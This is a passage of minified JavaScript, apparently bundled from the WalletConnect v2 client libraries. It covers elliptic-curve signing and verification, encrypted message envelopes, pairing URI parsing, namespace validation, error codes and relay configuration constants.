w{constructor(v,_,O){this.r=v,this.s=_,this.recovery=O,this.assertValidity()}static fromCompact(v){const _=e.nByteLength;return v=rc("compactSignature",v,_*2),new w(g(v,0,_),g(v,_,2*_))}static fromDER(v){const{r:_,s:O}=Wh.toSig(rc("DER",v));return new w(_,O)}assertValidity(){n0("r",this.r,Ls,i),n0("s",this.s,Ls,i)}addRecoveryBit(v){return new w(this.r,this.s,v)}recoverPublicKey(v){const{r:_,s:O,recovery:D}=this,R=I(rc("msgHash",v));if(D==null||![0,1,2,3].includes(D))throw new Error("recovery id invalid");const P=D===2||D===3?_+e.n:_;if(P>=t.ORDER)throw new Error("recovery id 2 or 3 invalid");const B=(D&1)===0?"02":"03",M=c.fromHex(B+h(P)),W=a(P),K=o(-R*W),q=o(O*W),J=c.BASE.multiplyAndAddUnsafe(M,K,q);if(!J)throw new Error("point at infinify");return J.assertValidity(),J}hasHighS(){return f(this.s)}normalizeS(){return this.hasHighS()?new w(this.r,o(-this.s),this.recovery):this}toDERRawBytes(){return u3(this.toDERHex())}toDERHex(){return Wh.hexFromSig({r:this.r,s:this.s})}toCompactRawBytes(){return u3(this.toCompactHex())}toCompactHex(){return h(this.r)+h(this.s)}}const m={isValidPrivateKey(b){try{return l(b),!0}catch{return!1}},normPrivateKeyToScalar:l,randomPrivateKey:()=>{const b=loe(e.n);return _nt(e.randomBytes(b),e.n)},precompute(b=8,v=c.BASE){return v._setWindowSize(b),v.multiply(BigInt(3)),v}};function x(b,v=!0){return c.fromPrivateKey(b).toRawBytes(v)}function S(b){const v=$g(b),_=typeof b=="string",O=(v||_)&&b.length;return v?O===n||O===s:_?O===2*n||O===2*s:b instanceof c}function T(b,v,_=!0){if(S(b))throw new Error("first arg must be private key");if(!S(v))throw new Error("second arg must be public key");return c.fromHex(v).multiply(l(b)).toRawBytes(_)}const k=e.bits2int||function(b){if(b.length>8192)throw new Error("input is too large");const v=q1(b),_=b.length*8-e.nBitLength;return _>0?v>>BigInt(_):v},I=e.bits2int_modN||function(b){return o(k(b))},E=mB(e.nBitLength);function C(b){return n0("num < 2^"+e.nBitLength,b,Gh,E),d3(b,e.nByteLength)}function N(b,v,_=L){if(["recovered","canonical"].some(ae=>ae in _))throw new Error("sign() legacy options not supported");const{hash:O,randomBytes:D}=e;let{lowS:R,prehash:P,extraEntropy:B}=_;R==null&&(R=!0),b=rc("msgHash",b),LK(_),P&&(b=rc("prehashed msgHash",O(b)));const M=I(b),W=l(v),K=[C(W),C(M)];if(B!=null&&B!==!1){const ae=B===!0?D(t.BYTES):B;K.push(rc("extraEntropy",ae))}const q=My(...K),J=M;function le(ae){const U=k(ae);if(!d(U))return;const G=a(U),Z=c.BASE.multiply(U).toAffine(),j=o(Z.x);if(j===Gh)return;const Y=o(G*o(J+j*W));if(Y===Gh)return;let se=(Z.x===j?0:2)|Number(Z.y&Ls),ne=Y;return R&&f(Y)&&(ne=p(Y),se^=1),new w(j,ne,se)}return{seed:q,k2sig:le}}const L={lowS:e.lowS,prehash:!1},$={lowS:e.lowS,prehash:!1};function y(b,v,_=L){const{seed:O,k2sig:D}=N(b,v,_),R=e;return noe(R.hash.outputLen,R.nByteLength,R.hmac)(O,D)}c.BASE._setWindowSize(8);function A(b,v,_,O=$){const D=b;v=rc("msgHash",v),_=rc("publicKey",_);const{lowS:R,prehash:P,format:B}=O;if(LK(O),"strict"in O)throw new Error("options.strict was renamed to lowS");if(B!==void 0&&B!=="compact"&&B!=="der")throw new Error("format must be compact or der");const M=typeof D=="string"||$g(D),W=!M&&!B&&typeof D=="object"&&D!==null&&typeof D.r=="bigint"&&typeof D.s=="bigint";if(!M&&!W)throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");let K,q;try{if(W&&(K=new w(D.r,D.s)),M){try{B!=="compact"&&(K=w.fromDER(D))}catch(Y){if(!(Y instanceof Wh.Err))throw Y}!K&&B!=="der"&&(K=w.fromCompact(D))}q=c.fromHex(_)}catch{return!1}if(!K||R&&K.hasHighS())return!1;P&&(v=e.hash(v));const{r:J,s:le}=K,ae=I(v),U=a(le),G=o(ae*U),Z=o(J*U),j=c.BASE.multiplyAndAddUnsafe(q,G,Z)?.toAffine();return j?o(j.x)===J:!1}return{CURVE:e,getPublicKey:x,getSharedSecret:T,sign:y,verify:A,ProjectivePoint:c,Signature:w,utils:m}}function znt(r){return{hash:r,hmac:(e,...t)=>wE(r,e,Krt(...t)),randomBytes:G3}}function Wnt(r,e){const t=i=>qnt({...r,...znt(i)});return{...t(e),create:t}}const foe=aoe(BigInt("0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff")),Hnt=foe.create(BigInt("-3")),Vnt=BigInt("0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b"),Knt=Wnt({a:Hnt,b:Vnt,Fp:foe,n:BigInt("0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551"),Gx:BigInt("0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296"),Gy:BigInt("0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5"),h:BigInt(1),lowS:!1},i6),poe="base10",Yo="base16",uu="base64pad",kf="base64url",s6="utf8",goe=0,s0=1,o6=2,Gnt=0,jK=1,Y5=12,wB=32;function Znt(){const r=OP.utils.randomPrivateKey(),e=OP.getPublicKey(r);return{privateKey:Fi(r,Yo),publicKey:Fi(e,Yo)}}function BP(){const r=G3(wB);return Fi(r,Yo)}function Ynt(r,e){const t=OP.getSharedSecret(En(r,Yo),En(e,Yo)),i=ent(i6,t,void 0,void 0,wB);return Fi(i,Yo)}function T9(r){const e=i6(En(r,Yo));return Fi(e,Yo)}function ld(r){const e=i6(En(r,s6));return Fi(e,Yo)}function moe(r){return En(`${r}`,poe)}function Rg(r){return Number(Fi(r,poe))}function woe(r){return r.replace(/\+/g,"-").replace(/\//g,"_").replace(/=/g,"")}function boe(r){const e=r.replace(/-/g,"+").replace(/_/g,"/"),t=(4-e.length%4)%4;return e+"=".repeat(t)}function Jnt(r){const e=moe(typeof r.type<"u"?r.type:goe);if(Rg(e)===s0&&typeof r.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");const t=typeof r.senderPublicKey<"u"?En(r.senderPublicKey,Yo):void 0,i=typeof r.iv<"u"?En(r.iv,Yo):G3(Y5),n=En(r.symKey,Yo),s=toe(n,i).encrypt(En(r.message,s6)),o=voe({type:e,sealed:s,iv:i,senderPublicKey:t});return r.encoding===kf?woe(o):o}function Qnt(r){const e=En(r.symKey,Yo),{sealed:t,iv:i}=Dy({encoded:r.encoded,encoding:r.encoding}),n=toe(e,i).decrypt(t);if(n===null)throw new Error("Failed to decrypt");return Fi(n,s6)}function Xnt(r,e){const t=moe(o6),i=G3(Y5),n=En(r,s6),s=voe({type:t,sealed:n,iv:i});return e===kf?woe(s):s}function est(r,e){const{sealed:t}=Dy({encoded:r,encoding:e});return Fi(t,s6)}function voe(r){if(Rg(r.type)===o6)return Fi(qf([r.type,r.sealed]),uu);if(Rg(r.type)===s0){if(typeof r.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");return Fi(qf([r.type,r.senderPublicKey,r.iv,r.sealed]),uu)}return Fi(qf([r.type,r.iv,r.sealed]),uu)}function Dy(r){const e=(r.encoding||uu)===kf?boe(r.encoded):r.encoded,t=En(e,uu),i=t.slice(Gnt,jK),n=jK;if(Rg(i)===s0){const c=n+wB,l=c+Y5,u=t.slice(n,c),d=t.slice(c,l),h=t.slice(l);return{type:i,sealed:h,iv:d,senderPublicKey:u}}if(Rg(i)===o6){const c=t.slice(n),l=G3(Y5);return{type:i,sealed:c,iv:l}}const s=n+Y5,o=t.slice(n,s),a=t.slice(s);return{type:i,sealed:a,iv:o}}function tst(r,e){const t=Dy({encoded:r,encoding:e?.encoding});return yoe({type:Rg(t.type),senderPublicKey:typeof t.senderPublicKey<"u"?Fi(t.senderPublicKey,Yo):void 0,receiverPublicKey:e?.receiverPublicKey})}function yoe(r){const e=r?.type||goe;if(e===s0){if(typeof r?.senderPublicKey>"u")throw new Error("missing sender public key");if(typeof r?.receiverPublicKey>"u")throw new Error("missing receiver public key")}return{type:e,senderPublicKey:r?.senderPublicKey,receiverPublicKey:r?.receiverPublicKey}}function FK(r){return r.type===s0&&typeof r.senderPublicKey=="string"&&typeof r.receiverPublicKey=="string"}function qK(r){return r.type===o6}function rst(r){const e=Buffer.from(r.x,"base64"),t=Buffer.from(r.y,"base64");return qf([new Uint8Array([4]),e,t])}function ist(r,e){const[t,i,n]=r.split("."),s=Buffer.from(boe(n),"base64");if(s.length!==64)throw new Error("Invalid signature length");const o=s.slice(0,32),a=s.slice(32,64),c=`${t}.${i}`,l=i6(c),u=rst(e);if(!Knt.verify(qf([o,a]),l,u))throw new Error("Invalid signature");return u0(r).payload}const nst="irn";function cx(r){return r?.relay||{protocol:nst}}function h5(r){const e=cR[r];if(typeof e>"u")throw new Error(`Relay Protocol not supported: ${r}`);return e}function sst(r,e="-"){const t={},i="relay"+e;return Object.keys(r).forEach(n=>{if(n.startsWith(i)){const s=n.replace(i,""),o=r[n];t[s]=o}}),t}function zK(r){if(!r.includes("wc:")){const l=qse(r);l!=null&&l.includes("wc:")&&(r=l)}r=r.includes("wc://")?r.replace("wc://",""):r,r=r.includes("wc:")?r.replace("wc:",""):r;const e=r.indexOf(":"),t=r.indexOf("?")!==-1?r.indexOf("?"):void 0,i=r.substring(0,e),n=r.substring(e+1,t).split("@"),s=typeof t<"u"?r.substring(t):"",o=new URLSearchParams(s),a={};o.forEach((l,u)=>{a[u]=l});const c=typeof a.methods=="string"?a.methods.split(","):void 0;return{protocol:i,topic:ost(n[0]),version:parseInt(n[1],10),symKey:a.symKey,relay:sst(a),methods:c,expiryTimestamp:a.expiryTimestamp?parseInt(a.expiryTimestamp,10):void 0}}function ost(r){return r.startsWith("//")?r.substring(2):r}function ast(r,e="-"){const t="relay",i={};return Object.keys(r).forEach(n=>{const s=n,o=t+e+s;r[s]&&(i[o]=r[s])}),i}function WK(r){const e=new URLSearchParams,t=ast(r.relay);Object.keys(t).sort().forEach(n=>{e.set(n,t[n])}),e.set("symKey",r.symKey),r.expiryTimestamp&&e.set("expiryTimestamp",r.expiryTimestamp.toString()),r.methods&&e.set("methods",r.methods.join(","));const i=e.toString();return`${r.protocol}:${r.topic}@${r.version}?${i}`}function $8(r,e,t){return`${r}?wc_ev=${t}&topic=${e}`}var cst=Object.defineProperty,lst=Object.defineProperties,ust=Object.getOwnPropertyDescriptors,HK=Object.getOwnPropertySymbols,dst=Object.prototype.hasOwnProperty,hst=Object.prototype.propertyIsEnumerable,VK=(r,e,t)=>e in r?cst(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,fst=(r,e)=>{for(var t in e||(e={}))dst.call(e,t)&&VK(r,t,e[t]);if(HK)for(var t of HK(e))hst.call(e,t)&&VK(r,t,e[t]);return r},pst=(r,e)=>lst(r,ust(e));function Y3(r){const e=[];return r.forEach(t=>{const[i,n]=t.split(":");e.push(`${i}:${n}`)}),e}function gst(r){const e=[];return Object.values(r).forEach(t=>{e.push(...Y3(t.accounts))}),e}function mst(r,e){const t=[];return Object.values(r).forEach(i=>{Y3(i.accounts).includes(e)&&t.push(...i.methods)}),t}function wst(r,e){const t=[];return Object.values(r).forEach(i=>{Y3(i.accounts).includes(e)&&t.push(...i.events)}),t}function CE(r){return r.includes(":")}function Qm(r){return CE(r)?r.split(":")[0]:r}function KK(r){var e,t,i;const n={};if(!Qf(r))return n;for(const[s,o]of Object.entries(r)){const a=CE(s)?[s]:o.chains,c=o.methods||[],l=o.events||[],u=Qm(s);n[u]=pst(fst({},n[u]),{chains:Sd(a,(e=n[u])==null?void 0:e.chains),methods:Sd(c,(t=n[u])==null?void 0:t.methods),events:Sd(l,(i=n[u])==null?void 0:i.events)})}return n}function bst(r){const e={};return r?.forEach(t=>{var i;const[n,s]=t.split(":");e[n]||(e[n]={accounts:[],chains:[],events:[],methods:[]}),e[n].accounts.push(t),(i=e[n].chains)==null||i.push(`${n}:${s}`)}),e}function GK(r,e){e=e.map(i=>i.replace("did:pkh:",""));const t=bst(e);for(const[i,n]of Object.entries(t))n.methods?n.methods=Sd(n.methods,r):n.methods=r,n.events=["chainChanged","accountsChanged"];return t}function vst(r,e){var t,i,n,s,o,a;const c=KK(r),l=KK(e),u={},d=Object.keys(c).concat(Object.keys(l));for(const h of d)u[h]={chains:Sd((t=c[h])==null?void 0:t.chains,(i=l[h])==null?void 0:i.chains),methods:Sd((n=c[h])==null?void 0:n.methods,(s=l[h])==null?void 0:s.methods),events:Sd((o=c[h])==null?void 0:o.events,(a=l[h])==null?void 0:a.events)};return u}const yst={INVALID_METHOD:{message:"Invalid method.",code:1001},INVALID_EVENT:{message:"Invalid event.",code:1002},INVALID_UPDATE_REQUEST:{message:"Invalid update request.",code:1003},INVALID_EXTEND_REQUEST:{message:"Invalid extend request.",code:1004},INVALID_SESSION_SETTLE_REQUEST:{message:"Invalid session settle request.",code:1005},UNAUTHORIZED_METHOD:{message:"Unauthorized method.",code:3001},UNAUTHORIZED_EVENT:{message:"Unauthorized event.",code:3002},UNAUTHORIZED_UPDATE_REQUEST:{message:"Unauthorized update request.",code:3003},UNAUTHORIZED_EXTEND_REQUEST:{message:"Unauthorized extend request.",code:3004},USER_REJECTED:{message:"User rejected.",code:5e3},USER_REJECTED_CHAINS:{message:"User rejected chains.",code:5001},USER_REJECTED_METHODS:{message:"User rejected methods.",code:5002},USER_REJECTED_EVENTS:{message:"User rejected events.",code:5003},UNSUPPORTED_CHAINS:{message:"Unsupported chains.",code:5100},UNSUPPORTED_METHODS:{message:"Unsupported methods.",code:5101},UNSUPPORTED_EVENTS:{message:"Unsupported events.",code:5102},UNSUPPORTED_ACCOUNTS:{message:"Unsupported accounts.",code:5103},UNSUPPORTED_NAMESPACE_KEY:{message:"Unsupported namespace key.",code:5104},USER_DISCONNECTED:{message:"User disconnected.",code:6e3},SESSION_SETTLEMENT_FAILED:{message:"Session settlement failed.",code:7e3},WC_METHOD_UNSUPPORTED:{message:"Unsupported wc_ method.",code:10001}},xst={NOT_INITIALIZED:{message:"Not initialized.",code:1},NO_MATCHING_KEY:{message:"No matching key.",code:2},RESTORE_WILL_OVERRIDE:{message:"Restore will override.",code:3},RESUBSCRIBED:{message:"Resubscribed.",code:4},MISSING_OR_INVALID:{message:"Missing or invalid.",code:5},EXPIRED:{message:"Expired.",code:6},UNKNOWN_TYPE:{message:"Unknown type.",code:7},MISMATCHED_TOPIC:{message:"Mismatched topic.",code:8},NON_CONFORMING_NAMESPACES:{message:"Non conforming namespaces.",code:9}};function at(r,e){const{message:t,code:i}=xst[r];return{message:e?`${t} ${e}`:t,code:i}}function Vi(r,e){const{message:t,code:i}=yst[r];return{message:e?`${t} ${e}`:t,code:i}}function Jf(r,e){return!!Array.isArray(r)}function Qf(r){return Object.getPrototypeOf(r)===Object.prototype&&Object.keys(r).length}function lo(r){return typeof r>"u"}function us(r,e){return e&&lo(r)?!0:typeof r=="string"&&!!r.trim().length}function bB(r,e){return e&&lo(r)?!0:typeof r=="number"&&!isNaN(r)}function Cst(r,e){const{requiredNamespaces:t}=e,i=Object.keys(r.namespaces),n=Object.keys(t);let s=!0;return k1(n,i)?(i.forEach(o=>{const{accounts:a,methods:c,events:l}=r.namespaces[o],u=Y3(a),d=t[o];(!k1(Dse(o,d),u)||!k1(d.methods,c)||!k1(d.events,l))&&(s=!1)}),s):!1}function lx(r){return us(r,!1)&&r.includes(":")?r.split(":").length===2:!1}function Est(r){if(us(r,!1)&&r.includes(":")){const e=r.split(":");if(e.length===3){const t=e[0]+":"+e[1];return!!e[2]&&lx(t)}}return!1}function _st(r){function e(t){try{return typeof new URL(t)<"u"}catch{return!1}}try{if(us(r,!1)){if(e(r))return!0;const t=qse(r);return e(t)}}catch{}return!1}function Sst(r){var e;return(e=r?.proposer)==null?void 0:e.publicKey}function Ast(r){return r?.topic}function Ist(r,e){let t=null;return us(r?.publicKey,!1)||(t=at("MISSING_OR_INVALID",`${e} controller public key should be a string`)),t}function ZK(r){let e=!0;return Jf(r)?r.length&&(e=r.every(t=>us(t,!1))):e=!1,e}function Tst(r,e,t){let i=null;return Jf(e)&&e.length?e.forEach(n=>{i||lx(n)||(i=Vi("UNSUPPORTED_CHAINS",`${t}, chain ${n} should be a string and conform to "namespace:chainId" format`))}):lx(r)||(i=Vi("UNSUPPORTED_CHAINS",`${t}, chains must be defined as "namespace:chainId" e.g. "eip155:1": {...} in the namespace key OR as an array of CAIP-2 chainIds e.g. eip155: { chains: ["eip155:1", "eip155:5"] }`)),i}function kst(r,e,t){let i=null;return Object.entries(r).forEach(([n,s])=>{if(i)return;const o=Tst(n,Dse(n,s),`${e} ${t}`);o&&(i=o)}),i}function Nst(r,e){let t=null;return Jf(r)?r.forEach(i=>{t||Est(i)||(t=Vi("UNSUPPORTED_ACCOUNTS",`${e}, account ${i} should be a string and conform to "namespace:chainId:address" format`))}):t=Vi("UNSUPPORTED_ACCOUNTS",`${e}, accounts should be an array of strings conforming to "namespace:chainId:address" format`),t}function Pst(r,e){let t=null;return Object.values(r).forEach(i=>{if(t)return;const n=Nst(i?.accounts,`${e} namespace`);n&&(t=n)}),t}function $st(r,e){let t=null;return ZK(r?.methods)?ZK(r?.events)||(t=Vi("UNSUPPORTED_EVENTS",`${e}, events should be an array of strings or empty array for no events`)):t=Vi("UNSUPPORTED_METHODS",`${e}, methods should be an array of strings or empty array for no methods`),t}function xoe(r,e){let t=null;return Object.values(r).forEach(i=>{if(t)return;const n=$st(i,`${e}, namespace`);n&&(t=n)}),t}function Rst(r,e,t){let i=null;if(r&&Qf(r)){const n=xoe(r,e);n&&(i=n);const s=kst(r,e,t);s&&(i=s)}else i=at("MISSING_OR_INVALID",`${e}, ${t} should be an object with data`);return i}function _T(r,e){let t=null;if(r&&Qf(r)){const i=xoe(r,e);i&&(t=i);const n=Pst(r,e);n&&(t=n)}else t=at("MISSING_OR_INVALID",`${e}, namespaces should be an object with data`);return t}function Coe(r){return us(r.protocol,!0)}function Ost(r,e){let t=!1;return r?r&&Jf(r)&&r.length&&r.forEach(i=>{t=Coe(i)}):t=!0,t}function Bst(r){return typeof r=="number"}function ba(r){return typeof r<"u"&&typeof r!==null}function Mst(r){return!(!r||typeof r!="object"||!r.code||!bB(r.code,!1)||!r.message||!us(r.message,!1))}function Dst(r){return!(lo(r)||!us(r.method,!1))}function Lst(r){return!(lo(r)||lo(r.result)&&lo(r.error)||!bB(r.id,!1)||!us(r.jsonrpc,!1))}function Ust(r){return!(lo(r)||!us(r.name,!1))}function YK(r,e){return!(!lx(e)||!gst(r).includes(e))}function jst(r,e,t){return us(t,!1)?mst(r,e).includes(t):!1}function Fst(r,e,t){return us(t,!1)?wst(r,e).includes(t):!1}function JK(r,e,t){let i=null;const n=qst(r),s=zst(e),o=Object.keys(n),a=Object.keys(s),c=QK(Object.keys(r)),l=QK(Object.keys(e)),u=c.filter(d=>!l.includes(d));return u.length&&(i=at("NON_CONFORMING_NAMESPACES",`${t} namespaces keys don't satisfy requiredNamespaces.
      Required: ${u.toString()}
      Received: ${Object.keys(e).toString()}`)),k1(o,a)||(i=at("NON_CONFORMING_NAMESPACES",`${t} namespaces chains don't satisfy required namespaces.
      Required: ${o.toString()}
      Approved: ${a.toString()}`)),Object.keys(e).forEach(d=>{if(!d.includes(":")||i)return;const h=Y3(e[d].accounts);h.includes(d)||(i=at("NON_CONFORMING_NAMESPACES",`${t} namespaces accounts don't satisfy namespace accounts for ${d}
        Required: ${d}
        Approved: ${h.toString()}`))}),o.forEach(d=>{i||(k1(n[d].methods,s[d].methods)?k1(n[d].events,s[d].events)||(i=at("NON_CONFORMING_NAMESPACES",`${t} namespaces events don't satisfy namespace events for ${d}`)):i=at("NON_CONFORMING_NAMESPACES",`${t} namespaces methods don't satisfy namespace methods for ${d}`))}),i}function qst(r){const e={};return Object.keys(r).forEach(t=>{var i;t.includes(":")?e[t]=r[t]:(i=r[t].chains)==null||i.forEach(n=>{e[n]={methods:r[t].methods,events:r[t].events}})}),e}function QK(r){return[...new Set(r.map(e=>e.includes(":")?e.split(":")[0]:e))]}function zst(r){const e={};return Object.keys(r).forEach(t=>{t.includes(":")?e[t]=r[t]:Y3(r[t].accounts)?.forEach(n=>{e[n]={accounts:r[t].accounts.filter(s=>s.includes(`${n}:`)),methods:r[t].methods,events:r[t].events}})}),e}function Wst(r,e){return bB(r,!1)&&r<=e.max&&r>=e.min}function XK(){const r=t6();return new Promise(e=>{switch(r){case dc.browser:e(Hst());break;case dc.reactNative:e(Vst());break;case dc.node:e(Kst());break;default:e(!0)}})}function Hst(){return K3()&&navigator?.onLine}async function Vst(){return Mp()&&typeof global<"u"&&global!=null&&global.NetInfo?(await(global==null?void 0:global.NetInfo.fetch()))?.isConnected:!0}function Kst(){return!0}function Gst(r){switch(t6()){case dc.browser:Zst(r);break;case dc.reactNative:Yst(r);break}}function Zst(r){!Mp()&&K3()&&(window.addEventListener("online",()=>r(!0)),window.addEventListener("offline",()=>r(!1)))}function Yst(r){Mp()&&typeof global<"u"&&global!=null&&global.NetInfo&&global?.NetInfo.addEventListener(e=>r(e?.isConnected))}function Jst(){var r;return K3()&&vn.getDocument()?((r=vn.getDocument())==null?void 0:r.visibilityState)==="visible":!0}const ST={};class Hb{static get(e){return ST[e]}static set(e,t){ST[e]=t}static delete(e){delete ST[e]}}var Qst={};const Eoe="wc",_oe=2,MP="core",Kd=`${Eoe}@2:${MP}:`,Xst={logger:"error"},eot={database:":memory:"},tot="crypto",eG="client_ed25519_seed",rot=fe.ONE_DAY,iot="keychain",not="0.3",sot="messages",oot="0.3",tG=fe.SIX_HOURS,aot="publisher",Soe="irn",cot="error",Aoe="wss://relay.walletconnect.org",lot="relayer",qs={message:"relayer_message",message_ack:"relayer_message_ack",connect:"relayer_connect",disconnect:"relayer_disconnect",error:"relayer_error",connection_stalled:"relayer_connection_stalled",transport_closed:"relayer_transport_closed",publish:"relayer_publish"},uot="_subscription",Wc={payload:"payload",connect:"connect",disconnect:"disconnect",error:"error"},dot=.1,DP="2.21.0",pn={link_mode:"link_mode",relay:"relay"},k9={inbound:"inbound",outbound:"outbound"},hot="0.3",fot="WALLETCONNECT_CLIENT_ID",rG="WALLETCONNECT_LINK_MODE_APPS",ec={created:"subscription_created",deleted:"subscription_deleted",expired:"subscription_expired",disabled:"subscription_disabled",sync:"subscription_sync",resubscribed:"subscription_resubscribed"},pot="subscription",got="0.3",mot="pairing",wot="0.3",Vb={wc_pairingDelete:{req:{ttl:fe.ONE_DAY,prompt:!1,tag:1e3},res:{ttl:fe.ONE_DAY,prompt:!1,tag:1001}},wc_pairingPing:{req:{ttl:fe.THIRTY_SECONDS,prompt:!1,tag:1002},res:{ttl:fe.THIRTY_SECONDS,prompt:!1,tag:1003}},unregistered_method:{req:{ttl:fe.ONE_DAY,prompt:!1,tag:0},res:{ttl:fe.ONE_DAY,prompt:!1,tag:0}}},g1={create:"pairing_create",expire:"pairing_expire",delete:"pairing_delete",ping:"pairing_ping"},Kl={created:"history_created",updated:"history_updated",deleted:"history_deleted",sync:"history_sync"},bot="history",vot="0.3",yot="expirer",Zc={created:"expirer_created",deleted:"expirer_deleted",expired:"expirer_expired",sync:"expirer_sync"},xot="0.3",Cot="verify-api",Eot="https://verify.walletconnect.com",Ioe="https://verify.walletconnect.org",J5=Ioe,_ot=`${J5}/v3`,Sot=[Eot,Ioe],Aot="echo",Iot="https://echo.walletconnect.com",rd={pairing_started:"pairing_started",pairing_uri_validation_success:"pairing_uri_validation_success",pairing_uri_not_expired:"pairing_uri_not_expired",store_new_pairing:"store_new_pairing",subscribing_pairing_topic:"subscribing_pairing_topic",subscribe_pairing_topic_success:"subscribe_pairing_topic_success",existing_pairing:"existing_pairing",pairing_not_expired:"pairing_not_expired",emit_inactive_pairing:"emit_inactive_pairing",emit_session_proposal:"emit_session_proposal",subscribing_to_pairing_topic:"subscribing_to_pairing_topic"},Oh={no_wss_connection:"no_wss_connection",no_internet_connection:"no_internet_connection",malformed_pairing_uri:"malformed_pairing_uri",active_pairing_already_exists:"active_pairing_already_exists",subscribe_pairing_topic_failure:"subscribe_pairing_topic_failure",pairing_expired:"pairing_expired",proposal_expired:"proposal_expired",proposal_listener_not_found:"proposal_listener_not_found"},Gl={session_approve_started:"session_approve_started",proposal_not_expired:"proposal_not_expired",session_namespaces_validation_success:"session_namespaces_validation_success",create_session_topic:"create_session_topic",subscribing_session_topic:"subscribing_session_topic",subscribe_session_topic_success:"subscribe_session_topic_success",publishing_session_approve:"publishing_session_approve",session_approve_publish_success:"session_approve_publish_success",store_session:"store_session",publishing_session_settle:"publishing_session_settle",session_settle_publish_success:"session_settle_publish_success"},Yp={no_internet_connection:"no_internet_connection",no_wss_connection:"no_wss_connection",proposal_expired:"proposal_expired",subscribe_session_topic_failure:"subscribe_session_topic_failure",session_approve_publish_failure:"session_approve_publish_failure",session_settle_publish_failure:"session_settle_publish_failure",session_approve_namespace_validation_failure:"session_approve_namespace_validation_failure",proposal_not_found:"proposal_not_found"},Jp={authenticated_session_approve_started:"authenticated_session_approve_started",create_authenticated_session_topic:"create_authenticated_session_topic",cacaos_verified:"cacaos_verified",store_authenticated_session:"store_authenticated_session",subscribing_authenticated_session_topic:"subscribing_authenticated_session_topic",subscribe_authenticated_session_topic_success:"subscribe_authenticated_session_topic_success",publishing_authenticated_session_approve:"publishing_authenticated_session_approve"},Kb={no_internet_connection:"no_internet_connection",invalid_cacao:"invalid_cacao",subscribe_authenticated_session_topic_failure:"subscribe_authenticated_session_topic_failure",authenticated_session_approve_publish_failure:"authenticated_session_approve_publish_failure",authenticated_session_pending_request_not_found:"authenticated_session_pending_request_not_found"},Tot=.1,kot="event-client",Not=86400,Pot="https://pulse.walletconnect.org/batch";function $ot(r,e){if(r.length>=255)throw new TypeError("Alphabet too long");for(var t=new Uint8Array(256),i=0;i<t.length;i++)t[i]=255;for(var n=0;n<r.length;n++){var s=r.charAt(n),o=s.charCodeAt(0);if(t[o]!==255)throw new TypeError(s+" is ambiguous");t[o]=n}var a=r.length,c=r.charAt(0),l=Math.log(a)/Math.log(256),u=Math.log(256)/Math.log(a);function d(p){if(p instanceof Uint8Array||(ArrayBuffer.isView(p)?p=new Uint8Array(p.buffer,p.byteOffset,p.byteLength):Array.isArray(p)&&(p=Uint8Array.from(p))),!(p instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(p.length===0)return"";for(var g=0,w=0,m=0,x=p.length;m!==x&&p[m]===0;)m++,g++;for(var S=(x-m)*u+1>>>0,T=new Uint8Array(S);m!==x;){for(var k=p[m],I=0,E=S-1;(k!==0||I<w)&&E!==-1;E--,I++)k+=256*T[E]>>>0,T[E]=k%a>>>0,k=k/a>>>0;if(k!==0)throw new Error("Non-zero carry");w=I,m++}for(var C=S-w;C!==S&&T[C]===0;)C++;for(var N=c.repeat(g);C<S;++C)N+=r.charAt(T[C]);return N}function h(p){if(typeof p!="string")throw new TypeError("Expected String");if(p.length===0)return new Uint8Array;var g=0;if(p[g]!==" "){for(var w=0,m=0;p[g]===c;)w++,g++;for(var x=(p.length-g)*l+1>>>0,S=new Uint8Array(x);p[g];){var T=t[p.charCodeAt(g)];if(T===255)return;for(var k=0,I=x-1;(T!==0||k<m)&&I!==-1;I--,k++)T+=a*S[I]>>>0,S[I]=T%256>>>0,T=T/256>>>0;if(T!==0)throw new Error("Non-zero carry");m=k,g++}if(p[g]!==" "){for(var E=x-m;E!==x&&S[E]===0;)E++;for(var C=new Uint8Array(w+(x-E)),N=w;E!==x;)C[N++]=S[E++];return C}}}function f(p){var g=h(p);if(g)return g;throw new Error(`Non-${e} character`)}return{encode:d,decodeUnsafe:h,decode:f}}var Rot=$ot,Oot=Rot;const Toe=r=>{if(r instanceof Uint8Array&&r.constructor.name==="Uint8Array")return r;if(r instanceof ArrayBuffer)return new Uint8Array(r);if(ArrayBuffer.isView(r))return new Uint8Array(r.buffer,r.byteOffset,r.byteLength);throw new Error("Unknown type, must be binary type")},Bot=r=>new TextEncoder().encode(r),Mot=r=>new TextDecoder().decode(r);class Dot{constructor(e,t,i){this.name=e,this.prefix=t,this.baseEncode=i}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}}class Lot{constructor(e,t,i){if(this.name=e,this.prefix=t,t.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=t.codePointAt(0),this.baseDecode=i}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return koe(this,e)}}class Uot{constructor(e){this.decoders=e}or(e){return koe(this,e)}decode(e){const t=e[0],i=this.decoders[t];if(i)return i.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}}const koe=(r,e)=>new Uot({...r.decoders||{[r.prefix]:r},...e.decoders||{[e.prefix]:e}});class jot{constructor(e,t,i,n){this.name=e,this.prefix=t,this.baseEncode=i,this.baseDecode=n,this.encoder=new Dot(e,t,i),this.decoder=new Lot(e,t,n)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}}const EE=({name:r,prefix:e,encode:t,decode:i})=>new jot(r,e,t,i),a6=({prefix:r,name:e,alphabet:t})=>{const{encode:i,decode:n}=Oot(t,e);return 